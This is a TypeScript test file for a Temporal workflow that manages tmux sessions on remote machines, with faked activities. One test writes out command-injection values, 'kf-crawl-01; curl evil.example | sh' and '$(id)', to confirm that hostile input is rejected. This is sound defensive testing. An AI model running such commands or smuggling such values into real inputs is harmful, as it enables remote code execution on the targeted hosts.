import * as path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { TestWorkflowEnvironment } from '@temporalio/testing';
import { bundleWorkflowCode, Worker, type WorkflowBundle } from '@temporalio/worker';
import type { ConvergeSessionInput, ConvergeSessionResult } from '../activities/panels';
import { tmuxWorkflowId } from '../panels/ids';
import { DEFAULT_WINDOWS } from '../panels/converge';
import type { TmuxSessionInput, TmuxSessionResult } from './tmuxSession';
// A STATIC import of the bundle module: what is being pinned is that both workflows are reachable
// from the one path `infra.ts` resolves.
import * as bundleModule from './infra';

/**
 * The converge workflow against a real Temporal, with FAKED activities.
 *
 * No Machine in this environment can be SSHed to, so what is under test is the workflow's own
 * behaviour: that it converges exactly once for a plain start, that its signals are applied in
 * order, that `kill` leaves the desired state "absent", and that hostile input fails without
 * reaching an activity at all.
 *
 * The bundle is `workflows/infra.ts`, not `workflows/tmuxSession.ts`, on purpose — the registration
 * seam is part of what slice 1 had to change (`infra.ts` used to resolve a single workflow file) and
 * a bundle that dropped `stackWorkflow` would break every `fleet` verb.
 */

/** A queue per run. Two workers on one task queue in one process are refused by the SDK
 * ("overlapping worker task types"), and a shut-down worker's registration lingers briefly. */
let queueSeq = 0;
const nextQueue = (): string => `tmux-session-test-${(queueSeq += 1)}`;

interface Recorded {
  converges: ConvergeSessionInput[];
  kills: Array<{ machine: string; session: string }>;
}

let env: TestWorkflowEnvironment;
let bundle: WorkflowBundle;

beforeAll(async () => {
  env = await TestWorkflowEnvironment.createLocal();
  bundle = await bundleWorkflowCode({ workflowsPath: path.join(__dirname, 'infra.ts') });
}, 300_000);

afterAll(async () => {
  await env?.teardown();
});

function activities(rec: Recorded, over: { fail?: boolean } = {}) {
  return {
    async convergeTmuxSession(input: ConvergeSessionInput): Promise<ConvergeSessionResult> {
      rec.converges.push(input);
      if (over.fail) throw new Error('apt-get: Unable to locate package tmux');
      return {
        machine: input.machine,
        session: input.session,
        windows: input.windows.map((w) => w.name),
        created: rec.converges.length === 1,
      };
    },
    async killTmuxSession(input: { machine: string; session: string }) {
      rec.kills.push({ machine: input.machine, session: input.session });
      return { machine: input.machine, session: input.session };
    },
  };
}

const INPUT: TmuxSessionInput = {
  machine: 'kf-crawl-01',
  host: '10.124.0.9',
  session: 'kontra-webcrawl',
  windows: [],
};

/** Run the workflow to completion, optionally signalling it as it starts. */
async function run(
  rec: Recorded,
  opts: {
    input?: TmuxSessionInput;
    signal?: { name: string; args?: unknown[] };
    fail?: boolean;
  } = {}
): Promise<TmuxSessionResult> {
  const queue = nextQueue();
  const worker = await Worker.create({
    connection: env.nativeConnection,
    taskQueue: queue,
    workflowBundle: bundle,
    activities: activities(rec, { ...(opts.fail === undefined ? {} : { fail: opts.fail }) }),
  });
  const input = opts.input ?? INPUT;
  const workflowId = `${tmuxWorkflowId(input.machine)}-${Math.random().toString(36).slice(2, 8)}`;
  return worker.runUntil(async () => {
    // signalWithStart, because the workflow is ONE-SHOT: it exits after a short grace window, so the
    // way a caller adds a window to a Machine is to signal the start rather than to chase a run.
    const handle = opts.signal
      ? await env.client.workflow.signalWithStart('tmuxSessionWorkflow', {
          taskQueue: queue,
          workflowId,
          args: [input],
          signal: opts.signal.name,
          signalArgs: opts.signal.args ?? [],
        })
      : await env.client.workflow.start('tmuxSessionWorkflow', {
          taskQueue: queue,
          workflowId,
          args: [input],
          // One writer per Machine, structurally — the same property `stackWorkflow` gets from its
          // id being the stack fqn.
          workflowIdConflictPolicy: 'FAIL',
        });
    return (await handle.result()) as TmuxSessionResult;
  });
}

describe('tmuxSessionWorkflow', () => {
  it('converges once, with the default journal windows', async () => {
    const rec: Recorded = { converges: [], kills: [] };
    const result = await run(rec);

    expect(rec.converges).toHaveLength(1);
    expect(rec.converges[0]).toMatchObject({
      machine: 'kf-crawl-01',
      host: '10.124.0.9',
      session: 'kontra-webcrawl',
    });
    // An empty window list means the defaults, and the defaults are journals — never the Worker
    // itself (ADR 0020, finding 2).
    expect(rec.converges[0]?.windows).toEqual([...DEFAULT_WINDOWS]);
    expect(result).toEqual({
      machine: 'kf-crawl-01',
      session: 'kontra-webcrawl',
      windows: ['actor', 'handler'],
      created: true,
    });
    expect(rec.kills).toEqual([]);
  }, 60_000);

  it('adds a window on the addWindow signal, idempotently', async () => {
    const rec: Recorded = { converges: [], kills: [] };
    const result = await run(rec, {
      signal: { name: 'addWindow', args: [{ name: 'scratch', command: 'journalctl -fu ssh.service' }] },
    });
    // The converge is re-run with the window added; the guard inside the script is what makes a
    // second run harmless.
    expect(rec.converges.length).toBeGreaterThanOrEqual(2);
    expect(rec.converges[rec.converges.length - 1]?.windows.map((w) => w.name)).toEqual([
      'actor',
      'handler',
      'scratch',
    ]);
    expect(result.windows).toContain('scratch');
  }, 60_000);

  it('recreates by killing first, then converging', async () => {
    const rec: Recorded = { converges: [], kills: [] };
    await run(rec, { signal: { name: 'recreate' } });
    expect(rec.kills).toHaveLength(1);
    expect(rec.converges.length).toBeGreaterThanOrEqual(2);
  }, 60_000);

  it('kills, and reports the desired state as absent', async () => {
    const rec: Recorded = { converges: [], kills: [] };
    const result = await run(rec, { signal: { name: 'kill' } });
    expect(rec.kills).toEqual([{ machine: 'kf-crawl-01', session: 'kontra-webcrawl' }]);
    // Not an error and not the old window list: the session is gone, and a tile must render "no
    // session — converge" rather than the last thing it saw.
    expect(result).toEqual({
      machine: 'kf-crawl-01',
      session: 'kontra-webcrawl',
      windows: [],
      created: false,
    });
  }, 60_000);

  it('refuses hostile input without reaching an activity', async () => {
    const rec: Recorded = { converges: [], kills: [] };
    await expect(
      run(rec, { input: { ...INPUT, machine: 'kf-crawl-01; curl evil.example | sh' } })
    ).rejects.toThrow();
    await expect(
      run(rec, { input: { ...INPUT, windows: [{ name: 'w', command: '$(id)' }] } })
    ).rejects.toThrow();
    // Non-retryable: a malformed name is not transient, and retrying only puts the same string in
    // front of the same shell twice more.
    expect(rec.converges).toEqual([]);
  }, 60_000);

  it('surfaces a converge that failed on the Machine, after retrying it', async () => {
    const rec: Recorded = { converges: [], kills: [] };
    const err: unknown = await run(rec, { fail: true }).then(
      () => new Error('the workflow should have failed'),
      (e: unknown) => e
    );
    // A failed converge is a FAILED WORKFLOW — the whole difference from the
    // `kontra-tmux.service` unit it replaces, whose failure was silent. The reason survives to the
    // caller through the failure's cause, which is what an operator reads in the Temporal UI.
    const chain: string[] = [];
    for (let e: unknown = err; e; e = (e as { cause?: unknown }).cause) {
      chain.push(String((e as { message?: string }).message ?? e));
    }
    expect(chain.join(' | ')).toMatch(/Unable to locate package tmux/);
    // Retried, because an apt lock and a rebooting Machine are both transient.
    expect(rec.converges).toHaveLength(3);
  }, 90_000);
});

describe('the INFRA_QUEUE workflow bundle', () => {
  it('exports both workflows, so registering one did not un-register the other', () => {
    // `infra.ts` resolves this module. If it ever exported only the tmux workflow, every
    // `kontra fleet` verb would fail with "workflow type not registered".
    const mod = bundleModule as unknown as Record<string, unknown>;
    expect(typeof mod.stackWorkflow).toBe('function');
    expect(typeof mod.tmuxSessionWorkflow).toBe('function');
  });

  it('keeps the two queries distinctly named', () => {
    const mod = bundleModule as unknown as Record<string, { name?: string }>;
    expect(mod.getProgress?.name).toBe('getProgress');
    expect(mod.getSessionState?.name).toBe('getSessionState');
  });
});
